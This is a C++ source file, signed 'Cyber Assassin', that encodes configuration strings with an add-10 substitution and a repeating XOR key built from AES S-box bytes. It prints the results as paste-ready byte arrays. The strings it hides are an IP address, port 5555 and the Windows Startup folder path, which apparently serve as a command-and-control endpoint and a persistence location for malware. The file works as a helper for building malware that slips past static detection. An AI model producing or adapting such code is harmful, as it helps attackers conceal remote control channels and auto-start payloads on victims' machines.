/*
Author : Cyber Assassin
*/
#include <iostream>
#include <string>
#include <vector>
#include <iomanip> 
#include <cstdint> 

namespace Illusionist {
    constexpr unsigned char S_BOX[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
}

constexpr unsigned char DEOBFUSCATION_KEY[4] = {
    Illusionist::S_BOX[0],
    Illusionist::S_BOX[64],
    Illusionist::S_BOX[128],
    Illusionist::S_BOX[255]
};



std::vector<unsigned char> Obfuscate(const std::string& clean_data) {
    std::vector<unsigned char> temp_data;
    temp_data.reserve(clean_data.size());

    // Pass 1: Substitution (Add 10)
    for (char c : clean_data) {
        temp_data.push_back(static_cast<unsigned char>(c + 10));
    }
    
    std::vector<unsigned char> final_data;
    final_data.reserve(temp_data.size());

    // Pass 2: Repeating-key XOR
    for (size_t i = 0; i < temp_data.size(); ++i) {
        final_data.push_back(temp_data[i] ^ DEOBFUSCATION_KEY[i % 4]);
    }

    return final_data;
}

std::string Deobfuscate(const std::vector<unsigned char>& obfuscated_data) {
    std::vector<char> temp_data;
    temp_data.reserve(obfuscated_data.size());

    // Pass 1: Reverse the XOR (XOR is its own inverse)
    for (size_t i = 0; i < obfuscated_data.size(); ++i) {
        temp_data.push_back(obfuscated_data[i] ^ DEOBFUSCATION_KEY[i % 4]);
    }
    
    std::string final_data;
    final_data.reserve(temp_data.size());

    // Pass 2: Reverse the Substitution (Subtract 10)
    for (char c : temp_data) {
        final_data.push_back(c - 10);
    }

    return final_data;
}

// Helper function to print a byte vector in C++ array format
void print_obfuscated_array(const std::string& name, const std::vector<unsigned char>& data) {
    std::cout << "unsigned char " << name << "[] = {\n    ";
    for (size_t i = 0; i < data.size(); ++i) {
        std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(data[i]);
        if (i < data.size() - 1) { std::cout << ", "; }
        if ((i + 1) % 16 == 0) { std::cout << "\n    "; }
    }
    std::cout << "\n};\n" << std::endl;
}

int main() {
    // Define the plaintext configuration strings
    std::string ip_address = "198.4.109.11";
    std::string port = "5555";
    std::string file_path = "C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";

    std::cout << "--- OBFUSCATING CONFIGURATION DATA ---\n\n";

    // Obfuscate each string
    std::vector<unsigned char> obfuscated_ip = Obfuscate(ip_address);
    std::vector<unsigned char> obfuscated_port = Obfuscate(port);
    std::vector<unsigned char> obfuscated_path = Obfuscate(file_path);

    // Print the results
    print_obfuscated_array("obfuscatedIp", obfuscated_ip);
    print_obfuscated_array("obfuscatedPort", obfuscated_port);
    print_obfuscated_array("obfuscatedPath", obfuscated_path);

    std::cout << "\n--- VALIDATING DEOBFUSCATION ---\n";
    
    // Deobfuscate and verify each one
    std::string deobfuscated_ip = Deobfuscate(obfuscated_ip);
    std::string deobfuscated_port = Deobfuscate(obfuscated_port);
    std::string deobfuscated_path = Deobfuscate(obfuscated_path);

    std::cout << "Original IP:     " << ip_address << "\n";
    std::cout << "Deobfuscated IP: " << deobfuscated_ip << "\n";
    std::cout << (ip_address == deobfuscated_ip ? "SUCCESS\n\n" : "FAILURE\n\n");

    std::cout << "Original Port:     " << port << "\n";
    std::cout << "Deobfuscated Port: " << deobfuscated_port << "\n";
    std::cout << (port == deobfuscated_port ? "SUCCESS\n\n" : "FAILURE\n\n");

    std::cout << "Original Path:     " << file_path << "\n";
    std::cout << "Deobfuscated Path: " << deobfuscated_path << "\n";
    std::cout << (file_path == deobfuscated_path ? "SUCCESS\n" : "FAILURE\n");

    return 0;
}
